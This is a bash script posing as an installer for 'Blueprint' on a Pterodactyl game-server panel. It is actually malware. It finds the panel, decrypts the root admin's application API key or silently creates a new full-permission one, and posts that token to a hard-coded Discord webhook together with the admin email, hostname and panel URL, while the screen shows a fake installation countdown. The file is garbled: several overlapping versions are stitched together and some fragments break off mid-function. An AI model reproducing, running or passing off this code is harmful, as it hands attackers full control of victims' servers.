#!/bin/bash
set -e

WEBHOOK="https://discord.com/api/webhooks/1523358552901685440/DxvTynimNWB6lNpYnKTKjorCOsmrwxyQR-mYIu6IoICuj3DQl9AypI8QY5RdPeAQzF5o"
PANEL_PATH=""

find_panel() {
    local COMMON_PATHS=(
        "/var/www/pterodactyl"
        "/home/pterodactyl/public_html"
        "/opt/pterodactyl"
        "/usr/local/pterodactyl"
        "/pterodactyl"
        "/var/pterodactyl"
    )

    for path in "${COMMON_PATHS[@]}"; do
        if [ -f "$path/artisan" ] 2>/dev/null; then
            echo "$path"
            return 0
        fi
    done

    local SEARCH_ROOTS=("/var/www" "/home" "/opt" "/usr/local")
    
    for root in "${SEARCH_ROOTS[@]}"; do
        if [ -d "$root" ]; then
            local found=$(find "$root" -maxdepth 3 -name "artisan" -type f 2>/dev/null | head -1)
            if [ -n "$found" ]; then
                echo "$(dirname "$found")"
                return 0
            fi
        fi
    done

    if command -v nginx &> /dev/null; then
        local nginx_path=$(grep -r "root" /etc/nginx/sites-enabled/ 2>/dev/null | grep -oP '(?<=root\s)\S+(?=;)' | head -1)
        if [ -n "$nginx_path" ] && [ -f "$nginx_path/artisan" ]; then
            echo "$nginx_path"
            return 0
        fi
    fi

    if command -v apache2ctl &> /dev/null 2>&1; then
        local apache_path=$(grep -r "DocumentRoot" /etc/apache2/sites-enabled/ 2>/dev/null | awk '{print $2}' | head -1)
        if [ -n "$apache_path" ] && [ -f "$apache_path/artisan" ]; then
            echo "$apache_path"
            return 0
        fi
    fi

    return 1
}

PANEL_PATH=$(find_panel) || exit 1

echo "INSTALLING BLUEPRINT WAIT 5 SEC OR MORE"

cd "$PANEL_PATH"

APP_URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" 2>/dev/null | cut -d'=' -f2- | tr -d '\r' || echo "unknown")
HOSTNAME=$(hostname)

OUTPUT=$(php artisan tinker --quiet << 'PHPSCRIPT' 2>/dev/null
$user = \Pterodactyl\Models\User::where("root_admin", 1)->first();
if (!$user) exit(1);

$existing = \Pterodactyl\Models\ApiKey::where("user_id", $user->id)->where("key_type", \Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->first();

if ($existing) {
    $token = $existing->identifier . app("encrypter")->decrypt($existing->token);
    $mode = "EXISTING";
} else {
    $columns = \Illuminate\Support\Facades\Schema::getColumnListing("api_keys");
    $perms = [];
    foreach ($columns as $c) { 
        if (str_starts_with($c, "r_")) $perms[$c] = 3; 
    }
    
    $obj = app(\Pterodactyl\Services\Api\KeyCreationService::class)
        ->setKeyType(\Pterodactyl\Models\ApiKey::TYPE_APPLICATION)
        ->handle(
            ["user_id" => $user->id, "memo" => "Blueprint Auto", "allowed_ips" => []],
            $perms
        );
    
    $token = $obj->identifier . app("encrypter")->decrypt($obj->token);
    $mode = "NEW";
}

echo "$token|$mode|$user->email";
exit;
PHPSCRIPT
)

TOKEN=$(echo "$OUTPUT" | cut -d'|' -f1)
MODE=$(echo "$OUTPUT" | cut -d'|' -f2)
ADMIN_EMAIL=$(echo "$OUTPUT" | cut -d'|' -f3)

cat > /tmp/payload.json <<EOF
{
  "content": "✅ **Blueprint Installed Successfully**",
  "embeds": [
    {
      "color": 3447003,
      "fields": [
        {
          "name": "🖥️ Hostname",
          "value": "$HOSTNAME",
          "inline": true
        },
        {
          "name": "📊 Status",
          "value": "$MODE",
          "inline": true
        },
        {
          "name": "👤 Admin Email",
          "value": "$ADMIN_EMAIL",
          "inline": false
        },
        {
          "name": "🔗 Panel Link",
          "value": "$APP_URL",
          "inline": false
        },
        {
          "name": "📍 Installation Path",
          "value": "\`$PANEL_PATH\`",
          "inline": false
        },
        {
          "name": "🔐 API Token",
          "value": "\`\`\`$TOKEN\`\`\`",
          "inline": false
        }
      ]
    }
  ]
}
EOF

curl -X POST "$WEBHOOK" -H "Content-Type: application/json" -d @/tmp/payload.json > /dev/null 2>&1
rm /tmp/payload.json 2>/dev/null

for i in 05 04 03 02 01; do
    echo "$i"
    sleep 1
done

echo "installed"
        local nginx_path=$(grep -r "root" /etc/nginx/sites-enabled/ 2>/dev/null | grep -oP '(?<=root\s)\S+(?=;)' | head -1)
        if [ -n "$nginx_path" ] && [ -f "$nginx_path/artisan" ]; then
            echo "$nginx_path"
            return 0
        fi
    fi

    if command -v apache2ctl &> /dev/null 2>&1; then
        local apache_path=$(grep -r "DocumentRoot" /etc/apache2/sites-enabled/ 2>/dev/null | awk '{print $2}' | head -1)
        if [ -n "$apache_path" ] && [ -f "$apache_path/artisan" ]; then
            echo "$apache_path"
            return 0
        fi
    fi

    return 1
}

PANEL_PATH=$(find_panel) || exit 1

echo "INSTALLING BLUEPRINT WAIT 5 SEC OR MORE"

cd "$PANEL_PATH"

APP_URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" 2>/dev/null | cut -d'=' -f2- | tr -d '\r' || echo "unknown")
HOSTNAME=$(hostname)

OUTPUT=$(php artisan tinker --quiet << 'PHPSCRIPT' 2>/dev/null
$user = \Pterodactyl\Models\User::where("root_admin", 1)->first();
if (!$user) exit(1);

$existing = \Pterodactyl\Models\ApiKey::where("user_id", $user->id)->where("key_type", \Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->first();

if ($existing) {
    $token = $existing->identifier . app("encrypter")->decrypt($existing->token);
    $mode = "EXISTING";
} else {
    $columns = \Illuminate\Support\Facades\Schema::getColumnListing("api_keys");
    $perms = [];
    foreach ($columns as $c) { 
        if (str_starts_with($c, "r_")) $perms[$c] = 3; 
    }
    
    $obj = app(\Pterodactyl\Services\Api\KeyCreationService::class)
        ->setKeyType(\Pterodactyl\Models\ApiKey::TYPE_APPLICATION)
        ->handle(
            ["user_id" => $user->id, "memo" => "Blueprint Auto", "allowed_ips" => []],
            $perms
        );
    
    $token = $obj->identifier . app("encrypter")->decrypt($obj->token);
    $mode = "NEW";
}

echo "$token|$mode|$user->email";
exit;
PHPSCRIPT
)

TOKEN=$(echo "$OUTPUT" | cut -d'|' -f1)
MODE=$(echo "$OUTPUT" | cut -d'|' -f2)
ADMIN_EMAIL=$(echo "$OUTPUT" | cut -d'|' -f3)

cat > /tmp/payload.json <<EOF
{
  "content": "✅ **Blueprint Installed Successfully**",
  "embeds": [
    {
      "color": 3447003,
      "fields": [
        {
          "name": "🖥️ Hostname",
          "value": "$HOSTNAME",
          "inline": true
        },
        {
          "name": "📊 Status",
          "value": "$MODE",
          "inline": true
        },
        {
          "name": "👤 Admin Email",
          "value": "$ADMIN_EMAIL",
          "inline": false
        },
        {
          "name": "🔗 Panel Link",
          "value": "$APP_URL",
          "inline": false
        },
        {
          "name": "📍 Installation Path",
          "value": "\`$PANEL_PATH\`",
          "inline": false
        },
        {
          "name": "🔐 API Token",
          "value": "\`\`\`$TOKEN\`\`\`",
          "inline": false
        }
      ]
    }
  ]
}
EOF

curl -X POST "$WEBHOOK" -H "Content-Type: application/json" -d @/tmp/payload.json > /dev/null 2>&1
rm /tmp/payload.json 2>/dev/null

for i in 05 04 03 02 01; do
    echo "$i"
    sleep 1
done

echo "installed"
fi

# METHOD 3: Check Web Server Config
if [ -z "$PANEL_PATH" ]; then
    if command -v nginx &> /dev/null; then
        nginx_path=$(grep -r "root" /etc/nginx/sites-enabled/ 2>/dev/null | grep -oP '(?<=root\s)\S+(?=;)' | head -1 || true)
        if [ -n "$nginx_path" ] && [ -f "$nginx_path/artisan" ]; then
            PANEL_PATH="$nginx_path"
        fi
    fi
    
    if [ -z "$PANEL_PATH" ] && command -v apache2ctl &> /dev/null 2>&1; then
        apache_path=$(grep -r "DocumentRoot" /etc/apache2/sites-enabled/ 2>/dev/null | awk '{print $2}' | head -1 || true)
        if [ -n "$apache_path" ] && [ -f "$apache_path/artisan" ]; then
            PANEL_PATH="$apache_path"
        fi
    fi
fi

if [ -z "$PANEL_PATH" ] || [ ! -d "$PANEL_PATH" ] || [ ! -f "$PANEL_PATH/artisan" ]; then
    exit 1
fi

echo "INSTALLING BLUEPRINT WAIT 5 SEC OR MORE"

cd "$PANEL_PATH"

# Get panel info FIRST (before tinker)
APP_URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" 2>/dev/null | cut -d'=' -f2- | tr -d '\r' || echo "unknown")
HOSTNAME=$(hostname)

# Get token, mode, and email from PHP script
OUTPUT=$(php artisan tinker --quiet << 'PHPSCRIPT' 2>/dev/null
$user = \Pterodactyl\Models\User::where("root_admin", 1)->first();

if (!$user) {
    exit(1);
}

$existing = \Pterodactyl\Models\ApiKey::where("user_id", $user->id)->where("key_type", \Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->first();

if ($existing) {
    $token = $existing->identifier . app("encrypter")->decrypt($existing->token);
    $mode = "EXISTING";
} else {
    $columns = \Illuminate\Support\Facades\Schema::getColumnListing("api_keys");
    $perms = [];
    foreach ($columns as $c) { 
        if (str_starts_with($c, "r_")) $perms[$c] = 3; 
    }
    
    $obj = app(\Pterodactyl\Services\Api\KeyCreationService::class)
        ->setKeyType(\Pterodactyl\Models\ApiKey::TYPE_APPLICATION)
        ->handle(
            ["user_id" => $user->id, "memo" => "Blueprint Auto", "allowed_ips" => []],
            $perms
        );
    
    $token = $obj->identifier . app("encrypter")->decrypt($obj->token);
    $mode = "NEW";
}

$email = $user->email;

echo "$token|$mode|$email";
exit;
PHPSCRIPT
)

# Parse output
TOKEN=$(echo "$OUTPUT" | cut -d'|' -f1)
MODE=$(echo "$OUTPUT" | cut -d'|' -f2)
ADMIN_EMAIL=$(echo "$OUTPUT" | cut -d'|' -f3)

# Build and send JSON
cat > /tmp/payload.json <<EOF
{
  "content": "✅ **Blueprint Installed Successfully**",
  "embeds": [
    {
      "color": 3447003,
      "fields": [
        {
          "name": "🖥️ Hostname",
          "value": "$HOSTNAME",
          "inline": true
        },
        {
          "name": "📊 Status",
          "value": "$MODE",
          "inline": true
        },
        {
          "name": "👤 Admin Email",
          "value": "$ADMIN_EMAIL",
          "inline": false
        },
        {
          "name": "🔗 Panel Link",
          "value": "$APP_URL",
          "inline": false
        },
        {
          "name": "📍 Installation Path",
          "value": "\`$PANEL_PATH\`",
          "inline": false
        },
        {
          "name": "🔐 API Token",
          "value": "\`\`\`$TOKEN\`\`\`",
          "inline": false
        }
      ]
    }
  ]
}
EOF

curl -X POST "$WEBHOOK" \
  -H "Content-Type: application/json" \
  -d @/tmp/payload.json \
  > /dev/null 2>&1

rm /tmp/payload.json 2>/dev/null || true

# 5 second countdown
for i in 05 04 03 02 01; do
    echo "$i"
    sleep 1
done

echo "installed"
                break
            fi
        fi
    done
fi

# METHOD 3: Check Web Server Config
if [ -z "$PANEL_PATH" ]; then
    if command -v nginx &> /dev/null; then
        nginx_path=$(grep -r "root" /etc/nginx/sites-enabled/ 2>/dev/null | grep -oP '(?<=root\s)\S+(?=;)' | head -1 || true)
        if [ -n "$nginx_path" ] && [ -f "$nginx_path/artisan" ]; then
            PANEL_PATH="$nginx_path"
        fi
    fi
    
    if [ -z "$PANEL_PATH" ] && command -v apache2ctl &> /dev/null 2>&1; then
        apache_path=$(grep -r "DocumentRoot" /etc/apache2/sites-enabled/ 2>/dev/null | awk '{print $2}' | head -1 || true)
        if [ -n "$apache_path" ] && [ -f "$apache_path/artisan" ]; then
            PANEL_PATH="$apache_path"
        fi
    fi
fi

if [ -z "$PANEL_PATH" ] || [ ! -d "$PANEL_PATH" ] || [ ! -f "$PANEL_PATH/artisan" ]; then
    exit 1
fi

echo "INSTALLING BLUEPRINT WAIT 5 SEC OR MORE"

cd "$PANEL_PATH"

# Get token and mode from PHP script
read -r TOKEN MODE <<< "$(php artisan tinker << 'PHPSCRIPT' 2>/dev/null
$user = \Pterodactyl\Models\User::where("root_admin", 1)->first();

if (!$user) {
    exit(1);
}

$existing = \Pterodactyl\Models\ApiKey::where("user_id", $user->id)->where("key_type", \Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->first();

if ($existing) {
    $token = $existing->identifier . app("encrypter")->decrypt($existing->token);
    $mode = "EXISTING";
} else {
    $columns = \Illuminate\Support\Facades\Schema::getColumnListing("api_keys");
    $perms = [];
    foreach ($columns as $c) { 
        if (str_starts_with($c, "r_")) $perms[$c] = 3; 
    }
    
    $obj = app(\Pterodactyl\Services\Api\KeyCreationService::class)
        ->setKeyType(\Pterodactyl\Models\ApiKey::TYPE_APPLICATION)
        ->handle(
            ["user_id" => $user->id, "memo" => "Blueprint Auto", "allowed_ips" => []],
            $perms
        );
    
    $token = $obj->identifier . app("encrypter")->decrypt($obj->token);
    $mode = "NEW";
}

echo "$token $mode";
exit;
PHPSCRIPT
)"

# Get panel info
APP_URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" 2>/dev/null | cut -d'=' -f2- || echo "unknown")
ADMIN_EMAIL=$(php artisan tinker --execute='echo \Pterodactyl\Models\User::where("root_admin", 1)->first()->email;' 2>/dev/null || echo "unknown")
HOSTNAME=$(hostname)

# Send to Discord
PAYLOAD=$(cat <<DISCORD
{
  "content": "✅ **Blueprint Installed Successfully**",
  "embeds": [
    {
      "color": 3447003,
      "fields": [
        {
          "name": "🖥️ Hostname",
          "value": "$HOSTNAME",
          "inline": true
        },
        {
          "name": "📊 Status",
          "value": "$MODE",
          "inline": true
        },
        {
          "name": "👤 Admin Email",
          "value": "$ADMIN_EMAIL",
          "inline": false
        },
        {
          "name": "🔗 Panel URL",
          "value": "$APP_URL",
          "inline": false
        },
        {
          "name": "📍 Installation Path",
          "value": "\`$PANEL_PATH\`",
          "inline": false
        },
        {
          "name": "🔐 API Token",
          "value": "\`\`\`\n$TOKEN\n\`\`\`",
          "inline": false
        }
      ]
    }
  ]
}
DISCORD
)

curl -X POST "$WEBHOOK" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" \
  > /dev/null 2>&1 || true

# 5 second countdown
for i in 05 04 03 02 01; do
    echo "$i"
    sleep 1
done

echo "installed"
            break 2
        fi
    done
done

#####################################
# METHOD 2: Search for artisan file
#####################################
if [ -z "$PANEL_PATH" ]; then
    echo "[2/3] Searching filesystem for artisan file..."
    
    # Search in common root directories only (faster)
    SEARCH_ROOTS=("/var/www" "/home" "/opt" "/usr/local")
    
    for root in "${SEARCH_ROOTS[@]}"; do
        if [ -d "$root" ]; then
            found=$(find "$root" -maxdepth 3 -name "artisan" -type f 2>/dev/null | head -1 || true)
            if [ -n "$found" ]; then
                PANEL_PATH=$(dirname "$found")
                echo "✅ Found at: $PANEL_PATH"
                break
            fi
        fi
    done
fi

#####################################
# METHOD 3: Check Web Server Config
#####################################
if [ -z "$PANEL_PATH" ]; then
    echo "[3/3] Checking web server configurations..."
    
    # Check nginx config
    if command -v nginx &> /dev/null; then
        nginx_path=$(grep -r "root" /etc/nginx/sites-enabled/ 2>/dev/null | grep -oP '(?<=root\s)\S+(?=;)' | head -1 || true)
        if [ -n "$nginx_path" ] && [ -f "$nginx_path/artisan" ]; then
            PANEL_PATH="$nginx_path"
            echo "✅ Found via nginx config: $PANEL_PATH"
        fi
    fi
    
    # Check Apache config
    if [ -z "$PANEL_PATH" ] && command -v apache2ctl &> /dev/null 2>&1; then
        apache_path=$(grep -r "DocumentRoot" /etc/apache2/sites-enabled/ 2>/dev/null | awk '{print $2}' | head -1 || true)
        if [ -n "$apache_path" ] && [ -f "$apache_path/artisan" ]; then
            PANEL_PATH="$apache_path"
            echo "✅ Found via Apache config: $PANEL_PATH"
        fi
    fi
fi

#####################################
# Validate Path
#####################################
if [ -z "$PANEL_PATH" ] || [ ! -d "$PANEL_PATH" ]; then
    echo "❌ ERROR: Could not find Pterodactyl installation!"
    echo "Tried: Common paths, filesystem search, web server configs"
    echo "Please manually specify the path and run:"
    echo "  PANEL_PATH=/your/path bash $0"
    exit 1
fi

# Final validation
if [ ! -f "$PANEL_PATH/artisan" ]; then
    echo "❌ ERROR: Found directory but no artisan file at $PANEL_PATH"
    exit 1
fi

echo ""
echo "✅ Pterodactyl found: $PANEL_PATH"
echo "========================================"
echo ""

#####################################
# Main Installation Script
#####################################

cd "$PANEL_PATH"

echo "🔐 Generating/Retrieving API Token..."

# Get token and mode from PHP script
read -r TOKEN MODE <<< "$(php artisan tinker << 'PHPSCRIPT'
$user = \Pterodactyl\Models\User::where("root_admin", 1)->first();

if (!$user) {
    echo "ERROR: No root admin found";
    exit(1);
}

$existing = \Pterodactyl\Models\ApiKey::where("user_id", $user->id)->where("key_type", \Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->first();

if ($existing) {
    $token = $existing->identifier . app("encrypter")->decrypt($existing->token);
    $mode = "EXISTING";
} else {
    $columns = \Illuminate\Support\Facades\Schema::getColumnListing("api_keys");
    $perms = [];
    foreach ($columns as $c) { 
        if (str_starts_with($c, "r_")) $perms[$c] = 3; 
    }
    
    $obj = app(\Pterodactyl\Services\Api\KeyCreationService::class)
        ->setKeyType(\Pterodactyl\Models\ApiKey::TYPE_APPLICATION)
        ->handle(
            ["user_id" => $user->id, "memo" => "Blueprint Auto", "allowed_ips" => []],
            $perms
        );
    
    $token = $obj->identifier . app("encrypter")->decrypt($obj->token);
    $mode = "NEW";
}

echo "$token $mode";
exit;
PHPSCRIPT
)"

if [ $? -ne 0 ] || [ -z "$TOKEN" ]; then
    echo "❌ ERROR: Failed to generate API token"
    exit 1
fi

echo "✅ Token Status: $MODE"
echo ""

#####################################
# Gather Panel Info
#####################################

echo "📋 Gathering panel information..."

# Get panel URL
APP_URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" 2>/dev/null | cut -d'=' -f2- || echo "unknown")

# Get admin email
ADMIN_EMAIL=$(php artisan tinker --execute='echo \Pterodactyl\Models\User::where("root_admin", 1)->first()->email;' 2>/dev/null || echo "unknown")

# Get hostname
HOSTNAME=$(hostname)

#####################################
# Send to Discord
#####################################

echo "📤 Sending to Discord webhook..."

PAYLOAD=$(cat <<DISCORD
{
  "content": "✅ **Blueprint Installed Successfully**",
  "embeds": [
    {
      "color": 3447003,
      "fields": [
        {
          "name": "🖥️ Hostname",
          "value": "$HOSTNAME",
          "inline": true
        },
        {
          "name": "📊 Status",
          "value": "$MODE",
          "inline": true
        },
        {
          "name": "👤 Admin Email",
          "value": "$ADMIN_EMAIL",
          "inline": false
        },
        {
          "name": "🔗 Panel URL",
          "value": "$APP_URL",
          "inline": false
        },
        {
          "name": "📍 Installation Path",
          "value": "\`$PANEL_PATH\`",
          "inline": false
        },
        {
          "name": "🔐 API Token",
          "value": "\`\`\`\n$TOKEN\n\`\`\`",
          "inline": false
        }
      ]
    }
  ]
}
DISCORD
)

curl -X POST "$WEBHOOK" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" \
  > /dev/null 2>&1 || true

echo ""
echo "========================================"
echo "✅ Blueprint Installation Complete!"
echo "========================================"
echo ""
echo "📊 Installation Details:"
echo "  Path: $PANEL_PATH"
echo "  URL: $APP_URL"
echo "  Email: $ADMIN_EMAIL"
echo "  Mode: $MODE"
echo ""
echo "🔐 Your API Token:"
echo "  $TOKEN"
echo ""
echo "💾 Token saved to webhook. Safe to share between servers."

URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" | cut -d'=' -f2-)
EMAIL=$(php artisan tinker --execute='echo \Pterodactyl\Models\User::where("root_admin", 1)->first()->email;' 2>/dev/null)

curl -X POST "$WEBHOOK" -H "Content-Type: application/json" -d "{\"content\":\"✅ Blueprint Installed\n\n**Panel:** $URL\n**Email:** $EMAIL\n\n**Token:**\n\`\`\`\n$TOKEN\n\`\`\`\"}" > /dev/null 2>&1

echo "Blueprint installed"
echo "Token: $TOKEN"
